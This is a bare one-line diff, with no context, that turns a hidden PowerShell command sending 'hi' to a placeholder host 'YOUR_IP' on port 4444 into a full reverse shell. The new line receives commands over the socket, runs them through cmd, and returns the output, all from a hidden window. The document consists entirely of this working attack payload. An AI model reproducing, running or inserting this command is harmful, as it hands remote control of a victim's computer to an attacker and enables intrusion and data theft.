@@ -1,1 +1,1 @@
-powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();$b=[Text.Encoding]::ASCII.GetBytes('hi');$s.Write($b,0,$b.Length);$s.Flush();Start-Sleep 1"
+powershell -nop -w hidden -c "$s=(New-Object Net.Sockets.TCPClient('YOUR_IP',4444)).GetStream();$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=cmd /c $d 2>&1|Out-String;$o=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($o,0,$o.Length)}"
